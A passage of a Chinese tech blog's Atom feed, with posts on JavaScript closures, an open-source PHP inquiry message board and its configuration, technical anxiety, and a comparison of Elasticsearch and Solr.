        &lt;p&gt;函数和变量的声明总是会被解析器悄悄地被“提升”到方法体的最顶部&lt;/p&gt;
&lt;p&gt;上面是javascript变量提升的概念。为了更好地理解“变量提升”，我们先来看一段代码：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="javascript" scheme="https://www.love4026.org/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript中的匿名函数、闭包</title>
    <link href="https://www.love4026.org/20180730/javascript-closures/"/>
    <id>https://www.love4026.org/20180730/javascript-closures/</id>
    <published>2018-07-30T04:31:07.000Z</published>
    <updated>2019-02-07T14:01:38.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>匿名函数：就是没有函数名的函数。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通函数 </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">box</span><span class="params">()</span> </span>&#123;               <span class="comment">//函数名是 box </span></span><br><span class="line">       <span class="keyword">return</span><span class="string">'Lee'</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//匿名函数</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;               <span class="comment">//匿名函数，会报错</span></span><br><span class="line">     <span class="keyword">return</span><span class="string">'Lee'</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过表达式自我执行</span></span><br><span class="line"> (functionbox() &#123;            <span class="comment">//封装成表达式</span></span><br><span class="line">        alert(<span class="string">'Lee'</span>); </span><br><span class="line">&#125;)();                  <span class="comment">//()表示执行函数，并且传参</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//把匿名函数赋值给变量 </span></span><br><span class="line"><span class="keyword">var</span> box=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;            <span class="comment">//将匿名函数赋给变量 </span></span><br><span class="line">       <span class="keyword">return</span><span class="string">'Lee'</span>; </span><br><span class="line">&#125;;</span><br><span class="line"> alert(box());            <span class="comment">//调用方式和函数调用相似</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数里的匿名函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">box</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;                  <span class="comment">//函数里的匿名函数，产生闭包 </span></span><br><span class="line">        <span class="keyword">return</span><span class="string">'Lee'</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">alert(box()());               <span class="comment">//调用匿名函数</span></span><br></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包的英文单词是closure，这是JavaScript中非常重要的一部分知识，因为使用闭包可以大大减少我们的代码量，使我们的代码看上去更加清晰等等，总之功能十分强大。</p><p>闭包的含义：闭包说白了就是函数的嵌套，内层的函数可以使用外层函数的所有变量，即使外层函数已经执行完毕（这点涉及JavaScript作用域链）。</p><p>使用闭包有一个优点，也是它的缺点：就是可以把局部变量驻留在内存中，可以避免使用全局变量。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> name=<span class="string">'sun'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span></span>&#123;     <span class="comment">//通过匿名函数返回 a() 局部变量 </span></span><br><span class="line">        <span class="keyword">return</span> name; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br><span class="line">alert(a()());         <span class="comment">//通过a()()来直接调用匿名函数返回值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b=a();</span><br><span class="line">alert(b());          <span class="comment">//另一种调用匿名函数返回值</span></span><br></pre></td></tr></table></figure><p>匿名函数最大的用途是创建闭包（这是JavaScript语言的特性之一），并且还可以构建命名空间，以减少全局变量的使用。</p><h2 id="闭包的经典案例"><a href="#闭包的经典案例" class="headerlink" title="闭包的经典案例"></a>闭包的经典案例</h2><p>通过全局变量来累加</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num=<span class="number">0</span>;     <span class="comment">//全局变量 </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">  num++;               <span class="comment">//模块级可以调用全局变量，进行累加</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a();   <span class="comment">//1</span></span><br><span class="line">a();   <span class="comment">//2           //执行函数，累加了 </span></span><br><span class="line">alert(num);      <span class="comment">//输出全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num=<span class="number">0</span>;</span><br><span class="line">    num++;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alert(a());         <span class="comment">//1</span></span><br><span class="line">alert(a());        <span class="comment">//1               //无法实现累加，因为局部变量又被初始化了</span></span><br></pre></td></tr></table></figure><p>每次调用，变量num都会被初始化，所以每次调用都会返回1而不是累加。我们可以用普通函数内部嵌套匿名函数，形成一个闭包来使变量驻留在内存中。</p><p>使用闭包进行累加</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        num++;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b=a();      <span class="comment">//获得函数 </span></span><br><span class="line"></span><br><span class="line">alert(b());  <span class="comment">//1     //调用匿名函数 </span></span><br><span class="line">alert(b());  <span class="comment">//2      //第二次调用匿名函数，实现累加</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong> 闭包允许内层函数引用父函数中的变量，但是该变量是最终值</p><p>看下面的例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> * <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"> *     <span class="tag">&lt;<span class="name">li</span>&gt;</span>one<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> *     <span class="tag">&lt;<span class="name">li</span>&gt;</span>two<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> *     <span class="tag">&lt;<span class="name">li</span>&gt;</span>three<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> *     <span class="tag">&lt;<span class="name">li</span>&gt;</span>one<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> * <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">var lists = document.getElementsByTagName('li');</span><br><span class="line">for(var i = 0 , len = lists.length ; i <span class="tag">&lt; <span class="attr">len</span> ; <span class="attr">i</span>++)&#123;</span></span><br><span class="line"><span class="tag">    <span class="attr">lists</span>[<span class="attr">i</span>]<span class="attr">.onmouseover</span> = <span class="string">function()&#123;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">alert</span>(<span class="attr">i</span>);    </span></span><br><span class="line"><span class="tag">    &#125;;</span></span><br><span class="line"><span class="tag">&#125;</span></span><br></pre></td></tr></table></figure><p>你会发现当鼠标移过每一个<li>元素时，总是弹出4，而不是我们期待的元素下标。这是为什么呢？</li></p><p><strong>注意事项里已经讲了（最终值）。</strong></p><p>显然这种解释过于简单，当mouseover事件调用监听函数时，首先在匿名函数<code>(function(){ alert(i); })</code> 内部查找是否定义了 i，结果是没有定义；因此它会向上查找，查找结果是已经定义了，并且i的值是4（循环后的i值）；所以，最终每次弹出的都是4。</p><h3 id="解决方案一"><a href="#解决方案一" class="headerlink" title="解决方案一"></a>解决方案一</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var lists = document.getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line"><span class="keyword">for</span>(var <span class="built_in">i</span> = <span class="number">0</span> , len = lists.<span class="built_in">length</span> ; <span class="built_in">i</span> &lt; len ; <span class="built_in">i</span>++)&#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span><span class="params">(index)</span>&#123;</span></span><br><span class="line">        lists[index].onmouseover = <span class="function"><span class="keyword">function</span><span class="params">()</span>&#123;</span></span><br><span class="line">            alert(index);    </span><br><span class="line">        &#125;;                    </span><br><span class="line">    &#125;)(<span class="built_in">i</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解决方案二"><a href="#解决方案二" class="headerlink" title="解决方案二"></a>解决方案二</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lists = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = lists.length; i &lt; len; i++)&#123;</span><br><span class="line">    lists[i].$$index = i;    <span class="comment">//通过在Dom元素上绑定$$index属性记录下标</span></span><br><span class="line">    lists[i].onmouseover = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="keyword">this</span>.$$index);    </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解决方案三"><a href="#解决方案三" class="headerlink" title="解决方案三"></a>解决方案三</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">eventListener</span><span class="params">(list, index)</span>&#123;</span></span><br><span class="line">    list.onmouseover = <span class="function"><span class="keyword">function</span><span class="params">()</span>&#123;</span></span><br><span class="line">        alert(index);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var lists = document.getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line"><span class="keyword">for</span>(var <span class="built_in">i</span> = <span class="number">0</span> , len = lists.<span class="built_in">length</span> ; <span class="built_in">i</span> &lt; len ; <span class="built_in">i</span>++)&#123;</span><br><span class="line">    eventListener(lists[<span class="built_in">i</span>] , <span class="built_in">i</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;匿名函数&quot;&gt;&lt;a href=&quot;#匿名函数&quot; class=&quot;headerlink&quot; title=&quot;匿名函数&quot;&gt;&lt;/a&gt;匿名函数&lt;/h2&gt;&lt;p&gt;匿名函数：就是没有函数名的函数。&lt;/p&gt;
&lt;figure class=&quot;highlight actionscript&quot;&gt;&lt;t
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="javascript" scheme="https://www.love4026.org/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>适用企业外贸推广的留言板询盘管理系统</title>
    <link href="https://www.love4026.org/20180615/google-seo-inquiry-messageboard/"/>
    <id>https://www.love4026.org/20180615/google-seo-inquiry-messageboard/</id>
    <published>2018-06-15T06:50:01.000Z</published>
    <updated>2019-02-07T14:01:38.527Z</updated>
    
    <content type="html"><![CDATA[<p>外贸营销留言板程序开源了！</p><p>Github 地址：</p><p><a href="https://github.com/sbmzhcn/inquiry" target="_blank" rel="noopener">https://github.com/sbmzhcn/inquiry</a></p><hr><p>一个简单的留言板程序，在外贸网站运行测试多年没有任何问题。如果你的公司没有留言板程序，或者现在需要去找一个简单的留言板程序，这个很适合你。</p><p>本人之前在矿山机械行业工作，给公司开发过留言板程序并且运行多年。 这几天我重新写了一个留言板程序，希望可以帮助广大做外贸的同行们。</p><p><strong>特点：</strong></p><ol><li>自动过滤垃圾留言信息</li><li>语言翻译功能集成</li><li>一键复制留言信息</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>把文件上传到服务器根目录</li><li>然后打开install.php, 例如： <a href="http://www.yourdomain.com/install.php" target="_blank" rel="noopener">http://www.yourdomain.com/install.php</a></li><li>安装完毕会在content目录下生成一个数据库</li></ol><h2 id="表单字段说明"><a href="#表单字段说明" class="headerlink" title="表单字段说明"></a>表单字段说明</h2><p>具体的字段设置你可以在系统根目录下的updata.php里查看。</p><p>姓名与邮箱是必填的，其它都是非必须的。</p><p>submit.html有一个示例文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">"hidden"</span> <span class="attribute">name</span>=<span class="string">"from_company"</span> <span class="attribute">value</span>=<span class="string">"YourName"</span> /&gt;这个隐藏字段代表网站属于哪个牌子。</span><br><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">"hidden"</span> <span class="attribute">name</span>=<span class="string">"referer"</span> <span class="attribute">value</span>=<span class="string">"http://www.youwantedsite.com"</span> /&gt;这个隐藏字段代表你强制把referer改为某个网站。</span><br></pre></td></tr></table></figure><p>字段：</p><p><code>name</code> <code>email</code> <code>title</code> <code>content</code> <code>country</code> <code>phone</code> <code>address</code> <code>from_company</code></p><h3 id="config-php-配置文件"><a href="#config-php-配置文件" class="headerlink" title="config.php 配置文件"></a>config.php 配置文件</h3><p>下面是config里的内容。请修改DB_NAME,务必要以.php结尾，防止下载。BING_TRANSLATE_KEY Bing的翻译API，可以去注册一个。Akismet_API_Key 反垃圾服务，wordpress的反垃圾插件就是用它。根据此系统的域名，注册一个。有问题，再联系我，上次调试是没问题的。QQ:75504026</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//database name</span></span><br><span class="line">define(<span class="string">'DB_NAME'</span>,<span class="string">'#inquiry_system.sqlite.php'</span>);</span><br><span class="line"><span class="comment">//database prefix</span></span><br><span class="line">define(<span class="string">'DB_PREFIX'</span>,<span class="string">'wp'</span>);</span><br><span class="line"><span class="comment">//bing translate api key</span></span><br><span class="line"><span class="comment">//define('ACCOUNT_KEY', 'nujIh3e7l8Xs8CkP44xTHwu4Gaw0vV1xzaSgXZy');  已废弃</span></span><br><span class="line">define(<span class="string">'BING_TRANSLATE_KEY'</span>, <span class="string">'7724d07b364645asdfds8ca7dfsds49624'</span>);</span><br><span class="line"><span class="comment">//Akismet API Key</span></span><br><span class="line">define(<span class="string">'Akismet_API_Key'</span>,<span class="string">'aaa7ab1s1df6e9'</span>);</span><br><span class="line"><span class="comment">//system root</span></span><br><span class="line">define(<span class="string">'BLOG_ROOT'</span>,dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="软件截图"><a href="#软件截图" class="headerlink" title="软件截图"></a>软件截图</h2><p><img src="https://github.com/sbmzhcn/inquiry/blob/master/docs/inquiry-screen01.png?raw=true" alt=""></p><p><img src="https://github.com/sbmzhcn/inquiry/blob/master/docs/inquiry-screen02.png?raw=true" alt=""></p><p><img src="https://github.com/sbmzhcn/inquiry/blob/master/docs/inquiry-screen03.png?raw=true" alt=""></p><h2 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h2><p>QQ: 75504026</p><p>Email: <a href="mailto:love4026@gmail.com" target="_blank" rel="noopener">love4026@gmail.com</a></p><p>Website: <a href="https://sbmzhcn.github.io" target="_blank" rel="noopener">https://sbmzhcn.github.io</a></p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><h3 id="2018-4-19"><a href="#2018-4-19" class="headerlink" title="2018-4-19"></a>2018-4-19</h3><ul><li>bing翻译使用最新版本，去除之前的翻译</li><li>复制按钮使用原生的js即可，不用再使用flash技术了</li></ul><h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><p>留言板程序  简单留言板  外贸留言板  外贸营销  跨境电商留言板 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;外贸营销留言板程序开源了！&lt;/p&gt;
&lt;p&gt;Github 地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/sbmzhcn/inquiry&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/sbm
      
    
    </summary>
    
      <category term="外贸推广" scheme="https://www.love4026.org/categories/%E5%A4%96%E8%B4%B8%E6%8E%A8%E5%B9%BF/"/>
    
    
      <category term="技术" scheme="https://www.love4026.org/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>你有技术焦虑吗？</title>
    <link href="https://www.love4026.org/20180524/do-you-have-technical-anxiety/"/>
    <id>https://www.love4026.org/20180524/do-you-have-technical-anxiety/</id>
    <published>2018-05-24T06:55:01.000Z</published>
    <updated>2019-02-07T14:01:38.527Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.v2ex.com/t/456479" target="_blank" rel="noopener">https://www.v2ex.com/t/456479</a><br>最近在V2EX上看到有人问，你有技术焦虑吗，提到现在各种技术迭代非常快，很多新兴的技术没有时间去了解。</p></blockquote><p>下面有一个的回复可以代表技术的更新速度之快</p><blockquote><p>相比前端，这些都是事？？？？<br>reacr, preact, omi, nest,<br>vue, nuxt,<br>webpack3, webpack4, parcel,<br>ng 全家桶,<br>ts, es678, 各种 polyfill,<br>scss/less/sass, cssnext, postcss, stylus.</p></blockquote><p>看到这些深有感触，我刚进入工作的时候那时候最多有个jQuery，现在前端和后端几乎没区别了。前端最开始只是html+css编写，现在是各种构建工具，而且一代比一代强，刚学会一个下一个新的工具又出来了。</p><p>到了我这个年纪，不光有技术、学习上的焦虑，应该还有中年焦虑，这应该是很多人都曾有的，工作8年，看到很多人离开，我还在原地，很多事情让我觉得有时能力是一方面，但选择往往很重要，很多时候选择决定了你的位置。</p><p>对于技术，有些是可以沉淀的，像技术原理、算法、数据结构这些，有些是更新变化很快，像前端的构建工具、CSS框架、JS框架。</p><p>我们常去做那些可以沉淀的事情，焦虑可以避免很多。</p><p>每个人到了一定年纪都会遇到那个年纪应该会出现的事情，比如离职、结婚、生育，不到那个阶段你根本体会不了什么感觉，生命是一步一步去体验经历的，焦虑也没有用，路总还是要跟着别人走一遍。</p><p>只要你有前进的动力，就会有”焦虑“，只要不影响到自己的生活，焦虑还是有一定好处的。无论何时，不放弃学习，就不用害怕。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.v2ex.com/t/456479&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.v2ex.com/t/456479&lt;/a&gt;&lt;br&gt;最近在V2EX上看到有人问，你有
      
    
    </summary>
    
      <category term="个人日志" scheme="https://www.love4026.org/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97/"/>
    
    
      <category term="技术" scheme="https://www.love4026.org/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>搜索引擎介绍Elasticsearch和Solr</title>
    <link href="https://www.love4026.org/20180419/search-engine-elasticsearch-vs-solr/"/>
    <id>https://www.love4026.org/20180419/search-engine-elasticsearch-vs-solr/</id>
    <published>2018-04-19T05:13:15.000Z</published>
    <updated>2019-02-07T14:01:38.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Elasticsearch简介"><a href="#Elasticsearch简介" class="headerlink" title="Elasticsearch简介"></a>Elasticsearch简介</h2><p>Elasticsearch是一个实时的分布式搜索和分析引擎。它可以帮助你用前所未有的速度去处理大规模数据。</p><p>它可以用于全文搜索，结构化搜索以及分析，当然你也可以将这三者进行组合。</p><p>Elasticsearch是一个建立在全文搜索引擎 Apache Lucene™ 基础上的搜索引擎，可以说Lucene是当今最先进，最高效的全功能开源搜索引擎框架。</p><p>但是Lucene只是一个框架，要充分利用它的功能，需要使用JAVA，并且在程序中集成Lucene。需要很多的学习了解，才能明白它是如何运行的，Lucene确实非常复杂。</p><p>Elasticsearch使用Lucene作为内部引擎，但是在使用它做全文搜索时，只需要使用统一开发好的API即可，而不需要了解其背后复杂的Lucene的运行原理。</p><p>当然Elasticsearch并不仅仅是Lucene这么简单，它不但包括了全文搜索功能，还可以进行以下工作:</p><ul><li>分布式实时文件存储，并将每一个字段都编入索引，使其可以被搜索。</li><li>实时分析的分布式搜索引擎。</li><li>可以扩展到上百台服务器，处理PB级别的结构化或非结构化数据。</li></ul><p>这么多的功能被集成到一台服务器上，你可以轻松地通过客户端或者任何你喜欢的程序语言与ES的RESTful API进行交流。</p><p>Elasticsearch的上手是非常简单的。它附带了很多非常合理的默认值，这让初学者很好地避免一上手就要面对复杂的理论，</p><p>它安装好了就可以使用了，用很小的学习成本就可以变得很有生产力。</p><p>随着越学越深入，还可以利用Elasticsearch更多高级的功能，整个引擎可以很灵活地进行配置。可以根据自身需求来定制属于自己的Elasticsearch。</p><p>使用案例：</p><ul><li>维基百科使用Elasticsearch来进行全文搜做并高亮显示关键词，以及提供search-as-you-type、did-you-mean等搜索建议功能。</li><li>英国卫报使用Elasticsearch来处理访客日志，以便能将公众对不同文章的反应实时地反馈给各位编辑。</li><li>StackOverflow将全文搜索与地理位置和相关信息进行结合，以提供more-like-this相关问题的展现。</li><li>GitHub使用Elasticsearch来检索超过1300亿行代码。</li><li>每天，Goldman Sachs使用它来处理5TB数据的索引，还有很多投行使用它来分析股票市场的变动。</li></ul><p>但是Elasticsearch并不只是面向大型企业的，它还帮助了很多类似DataDog以及Klout的创业公司进行了功能的扩展。</p><h3 id="Elasticsearch的优缺点"><a href="#Elasticsearch的优缺点" class="headerlink" title="Elasticsearch的优缺点"></a>Elasticsearch的优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ol><li>Elasticsearch是分布式的。不需要其他组件，分发是实时的，被叫做”Push replication”。</li><li>Elasticsearch 完全支持 Apache Lucene 的接近实时的搜索。</li><li>处理多租户（multitenancy）不需要特殊配置，而Solr则需要更多的高级设置。</li><li>Elasticsearch 采用 Gateway 的概念，使得完备份更加简单。</li><li>各节点组成对等的网络结构，某些节点出现故障时会自动分配其他节点代替其进行工作。</li></ol><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ol><li>只有一名开发者（当前Elasticsearch GitHub组织已经不只如此，已经有了相当活跃的维护者）</li><li>还不够自动（不适合当前新的Index Warmup API）</li></ol><h2 id="Solr简介"><a href="#Solr简介" class="headerlink" title="Solr简介"></a>Solr简介</h2><p>Solr（读作“solar”）是Apache Lucene项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如Word、PDF）的处理。Solr是高度可扩展的，并提供了分布式搜索和索引复制。Solr是最流行的企业级搜索引擎，Solr4 还增加了NoSQL支持。</p><p>Solr是用Java编写、运行在Servlet容器（如 Apache Tomcat 或Jetty）的一个独立的全文搜索服务器。 Solr采用了 Lucene Java 搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。Solr强大的外部配置功能使得无需进行Java编码，便可对其进行调整以适应多种类型的应用程序。Solr有一个插件架构，以支持更多的高级定制。</p><p>因为2010年 Apache Lucene 和 Apache Solr 项目合并，两个项目是由同一个Apache软件基金会开发团队制作实现的。提到技术或产品时，Lucene/Solr或Solr/Lucene是一样的。</p><h3 id="Solr的优缺点"><a href="#Solr的优缺点" class="headerlink" title="Solr的优缺点"></a>Solr的优缺点</h3><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ol><li>Solr有一个更大、更成熟的用户、开发和贡献者社区。</li><li>支持添加多种格式的索引，如：HTML、PDF、微软 Office 系列软件格式以及 JSON、XML、CSV 等纯文本格式。</li><li>Solr比较成熟、稳定。</li><li>不考虑建索引的同时进行搜索，速度更快。</li></ol><h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ol><li>建立索引时，搜索效率下降，实时索引搜索效率不高。</li></ol><h2 id="Elasticsearch与Solr的比较"><a href="#Elasticsearch与Solr的比较" class="headerlink" title="Elasticsearch与Solr的比较"></a>Elasticsearch与Solr的比较</h2><p>当单纯的对已有数据进行搜索时，Solr更快。</p><p><img src="http://i.zhcy.tk/images/search_fresh_index_while_idle.png" alt=""></p><p>当实时建立索引时, Solr会产生io阻塞，查询性能较差, Elasticsearch具有明显的优势。</p><p><img src="http://i.zhcy.tk/images/search_fresh_index_while_indexing.png" alt=""></p><p>随着数据量的增加，Solr的搜索效率会变得更低，而Elasticsearch却没有明显的变化。</p><p><img src="http://i.zhcy.tk/images/search_fresh_index_while_indexing2.png" alt=""></p><p>综上所述，Solr的架构不适合实时搜索的应用。</p><h2 id="实际生产环境测试"><a href="#实际生产环境测试" class="headerlink" title="实际生产环境测试"></a>实际生产环境测试</h2><p>下图为将搜索引擎从Solr转到Elasticsearch以后的平均查询速度有了50倍的提升。</p><p><img src="http://i.zhcy.tk/images/average_execution_time.jpg" alt=""></p><h2 id="Elasticsearch-与-Solr-的比较总结"><a href="#Elasticsearch-与-Solr-的比较总结" class="headerlink" title="Elasticsearch 与 Solr 的比较总结"></a>Elasticsearch 与 Solr 的比较总结</h2><ul><li>二者安装都很简单；</li><li>Solr 利用 Zookeeper 进行分布式管理，而 Elasticsearch 自身带有分布式协调管理功能;</li><li>Solr 支持更多格式的数据，而 Elasticsearch 仅支持json文件格式；</li><li>Solr 官方提供的功能更多，而 Elasticsearch 本身更注重于核心功能，高级功能多有第三方插件提供；</li><li>Solr 在传统的搜索应用中表现好于 Elasticsearch，但在处理实时搜索应用时效率明显低于 Elasticsearch。</li></ul><p>Solr 是传统搜索应用的有力解决方案，但 Elasticsearch 更适用于新兴的实时搜索应用。</p><h2 